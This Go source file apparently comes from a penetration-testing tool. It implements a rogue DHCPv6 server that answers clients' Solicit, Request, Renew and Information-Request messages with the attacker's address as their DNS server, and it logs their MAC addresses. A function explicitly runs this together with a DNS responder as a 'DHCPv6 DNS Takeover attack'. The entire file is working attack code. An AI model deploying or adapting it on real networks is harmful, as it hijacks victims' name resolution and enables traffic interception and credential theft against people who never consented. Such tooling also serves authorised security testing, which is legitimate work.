package main

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/insomniacslk/dhcp/dhcpv6"
	"github.com/insomniacslk/dhcp/dhcpv6/server6"
	"github.com/insomniacslk/dhcp/iana"
	"golang.org/x/sync/errgroup"
)

// DHCPv6 default values.
const (
	// The valid lifetime for the IPv6 prefix in the option, expressed in units
	// of seconds.  A value of 0xFFFFFFFF represents infinity.
	dhcpv6DefaultValidLifetime = 300 * time.Second

	// The time at which the requesting router should contact the delegating
	// router from which the prefixes in the IA_PD were obtained to extend the
	// lifetimes of the prefixes delegated to the IA_PD; T1 is a time duration
	// relative to the current time expressed in units of seconds.
	dhcpv6T1 = 200 * time.Second

	// The time at which the requesting router should contact any available
	// delegating router to extend the lifetimes of the prefixes assigned to the
	// IA_PD; T2 is a time duration relative to the current time expressed in
	// units of seconds.
	dhcpv6T2 = 250 * time.Second
)

// dhcpv6LinkLocalPrefix is the 64-bit link local IPv6 prefix.
var dhcpv6LinkLocalPrefix = []byte{0xfe, 0x80, 0, 0, 0, 0, 0, 0}

// DHCPv6Handler holds the state for of the DHCPv6 handler method Handler().
type DHCPv6Handler struct {
	logger   *Logger
	serverID dhcpv6.Duid
	config   Config
}

// NewDHCPv6Handler returns a DHCPv6Handler.
func NewDHCPv6Handler(config Config, logger *Logger) *DHCPv6Handler {
	return &DHCPv6Handler{
		logger: logger,
		config: config,
		serverID: dhcpv6.Duid{
			Type:          dhcpv6.DUID_LL,
			HwType:        iana.HWTypeEthernet,
			LinkLayerAddr: config.Interface.HardwareAddr,
		},
	}
}

// ConfigureResponseOpts returns the IP that should be assigned based on the
// request IA_NA and the modifiers to configure the response with that IP and
// the DNS server configured in the DHCPv6Handler.
func (h *DHCPv6Handler) ConfigureResponseOpts(requestIANA *dhcpv6.OptIANA,
	msg *dhcpv6.Message, peer net.IP) (net.IP, []dhcpv6.Modifier, error) {
	cid := msg.GetOneOption(dhcpv6.OptionClientID)
	if cid == nil {
		return nil, nil, fmt.Errorf("no client ID option from DHCPv6 message")
	}

	duid, err := dhcpv6.DuidFromBytes(cid.ToBytes())
	if err != nil {
		return nil, nil, fmt.Errorf("deserialize DUI")
	}

	var leasedIP net.IP

	if duid.LinkLayerAddr == nil {
		if !peer.IsLinkLocalUnicast() {
			// we could also generate a random IP here
			return nil, nil, fmt.Errorf("peer is not a link local unicast address and did not disclose link layer address")
		}

		leasedIP = peer
	} else {
		go h.logger.HostInfoCache.SaveMACFromIP(peer, duid.LinkLayerAddr)

		leasedIP = append(leasedIP, dhcpv6LinkLocalPrefix...)
		// if the IP has the first few bits after the prefix set, Windows won't
		// route queries via this IP and use the link-local address instead.
		leasedIP = append(leasedIP, 0xff, 0xff) // nolint:gomnd
		leasedIP = append(leasedIP, duid.LinkLayerAddr...)
	}

	return leasedIP, []dhcpv6.Modifier{
		dhcpv6.WithServerID(h.serverID),
		dhcpv6.WithDNS(h.config.LocalIPv6),
		dhcpv6.WithOption(&dhcpv6.OptIANA{
			IaId: requestIANA.IaId,
			T1:   dhcpv6T1,
			T2:   dhcpv6T2,
			Options: dhcpv6.IdentityOptions{
				Options: []dhcpv6.Option{
					&dhcpv6.OptIAAddress{
						IPv6Addr:          leasedIP,
						PreferredLifetime: h.config.LeaseLifetime,
						ValidLifetime:     h.config.LeaseLifetime,
					},
				},
			},
		}),
	}, nil
}

func extractIANA(innerMessage *dhcpv6.Message) (*dhcpv6.OptIANA, error) {
	iaNAOpt := innerMessage.GetOneOption(dhcpv6.OptionIANA)
	if iaNAOpt == nil {
		return nil, fmt.Errorf("message does not contain IANA:\n%s", innerMessage.Summary())
	}

	iaNA, ok := iaNAOpt.(*dhcpv6.OptIANA)
	if !ok {
		return nil, fmt.Errorf("unexpected type for IANA option: %T", iaNAOpt)
	}

	return iaNA, nil
}

func addrToIP(addr net.Addr) net.IP {
	udpAddr, ok := addr.(*net.UDPAddr)
	if ok {
		return udpAddr.IP
	}

	addrString := addr.String()

	for strings.Contains(addrString, "/") || strings.Contains(addrString, "%") {
		addrString = strings.SplitN(addrString, "/", 2)[0] // nolint:gomnd
		addrString = strings.SplitN(addrString, "%", 2)[0] // nolint:gomnd
	}

	splitAddr, _, err := net.SplitHostPort(addrString)
	if err == nil {
		addrString = splitAddr
	}

	return net.ParseIP(addrString)
}

// Handler implements a server6.Handler.
func (h *DHCPv6Handler) handler(conn net.PacketConn, peer net.Addr, m dhcpv6.DHCPv6) error { // nolint:cyclop
	if !filterDHCP(h.config, addrToIP(peer)) {
		h.logger.IgnoreDHCP(m.Type().String(), addrToIP(peer))

		return nil
	}

	msg, err := m.GetInnerMessage()
	if err != nil {
		return fmt.Errorf("get inner message: %w", err)
	}

	var answer *dhcpv6.Message

	switch m.Type() {
	case dhcpv6.MessageTypeSolicit:
		iaNA, err := extractIANA(msg)
		if err != nil {
			return fmt.Errorf("extract IANA: %w", err)
		}

		ip, opts, err := h.ConfigureResponseOpts(iaNA, msg, addrToIP(peer))
		if err != nil {
			return fmt.Errorf("configure response options: %w", err)
		}

		h.logger.Infof("responding to %s from %s with IP %s", m.Type(), peer, ip)

		answer, err = dhcpv6.NewAdvertiseFromSolicit(msg, opts...)
		if err != nil {
			return fmt.Errorf("cannot create DHCPv6 ADVERTISE from %s: %w", m.Type(), err)
		}
	case dhcpv6.MessageTypeRequest, dhcpv6.MessageTypeRebind, dhcpv6.MessageTypeRenew:
		iaNA, err := extractIANA(msg)
		if err != nil {
			return fmt.Errorf("extract IANA: %w", err)
		}

		ip, opts, err := h.ConfigureResponseOpts(iaNA, msg, addrToIP(peer))
		if err != nil {
			return fmt.Errorf("configure response options: %w", err)
		}

		answer, err = dhcpv6.NewReplyFromMessage(msg, opts...)
		if err != nil {
			return fmt.Errorf("cannot create DHCPv6 REPLY from %s: %w", m.Type(), err)
		}

		h.logger.Infof("respond to %s from %s by assigning DNS server and IPv6 %q", m.Type(), peer, ip)
	case dhcpv6.MessageTypeConfirm:
		h.logger.Infof("rejecting %s from %q", m.Type().String(), peer.String())

		answer, err = dhcpv6.NewReplyFromMessage(msg, dhcpv6.WithServerID(h.serverID), dhcpv6.WithDNS(h.config.LocalIPv6),
			dhcpv6.WithOption(&dhcpv6.OptStatusCode{
				StatusCode:    iana.StatusNotOnLink,
				StatusMessage: iana.StatusNotOnLink.String(),
			}))
		if err != nil {
			return fmt.Errorf("cannot create reply to CONFIRM DHCPv6 advertise from %s: %w", m.Type(), err)
		}
	case dhcpv6.MessageTypeInformationRequest:
		answer, err = dhcpv6.NewReplyFromMessage(msg, dhcpv6.WithServerID(h.serverID), dhcpv6.WithDNS(h.config.LocalIPv6))
		if err != nil {
			return fmt.Errorf("cannot create reply to information request: %w", err)
		}

		h.logger.Infof("respond to information request by %s with DNS server", peer)
	default:
		h.logger.Debugf("unhandled DHCP message:\n%s", m.Summary())

		return nil
	}

	_, err = conn.WriteTo(answer.ToBytes(), peer)
	if err != nil {
		return fmt.Errorf("write to connection: %w", err)
	}

	return nil
}

// Handler implements a server6.Handler.
func (h *DHCPv6Handler) Handler(conn net.PacketConn, peer net.Addr, m dhcpv6.DHCPv6) {
	err := h.handler(conn, peer, m)
	if err != nil {
		h.logger.Errorf(err.Error())
	}
}

// RunDHCPv6 starts a DHCPv6 server which assigns a DNS server.
func RunDHCPv6(ctx context.Context, logger *Logger, config Config) error {
	listenAddr := &net.UDPAddr{
		IP:   dhcpv6.AllDHCPRelayAgentsAndServers,
		Port: dhcpv6.DefaultServerPort,
	}

	dhcvpv6Handler := NewDHCPv6Handler(config, logger)

	conn, err := ListenUDPMulticast(config.Interface, listenAddr)
	if err != nil {
		return err
	}

	server, err := server6.NewServer(config.Interface.Name, nil, dhcvpv6Handler.Handler,
		server6.WithConn(conn))
	if err != nil {
		return fmt.Errorf("starting DHCPv6 server: %w", err)
	}

	go func() {
		<-ctx.Done()

		_ = server.Close()
	}()

	logger.Infof("starting server on %s", listenAddr)

	err = server.Serve()

	// if the server is stopped via ctx, we suppress the resulting errors that
	// result from server.Close closing the connection.
	if ctx.Err() != nil {
		return nil // nolint:nilerr
	}

	return err
}

// RunDHCPv6DNSTakeover runs a DHCPv6 server and an DNS server for a DHCPv6 DNS
// Takeover attack.
func RunDHCPv6DNSTakeover(ctx context.Context, logger *Logger, config Config) error {
	errGroup, ctx := errgroup.WithContext(ctx)

	errGroup.Go(func() error {
		dhcpv6Logger := logger.WithPrefix("DHCPv6")

		err := RunDHCPv6(ctx, dhcpv6Logger, config)
		if err != nil {
			dhcpv6Logger.Errorf(err.Error())
		}

		return nil
	})

	errGroup.Go(func() error {
		dnsLogger := logger.WithPrefix("DNS")

		err := RunDNSResponder(ctx, dnsLogger, config)
		if err != nil {
			dnsLogger.Errorf(err.Error())
		}

		return nil
	})

	_ = errGroup.Wait()

	return nil
}
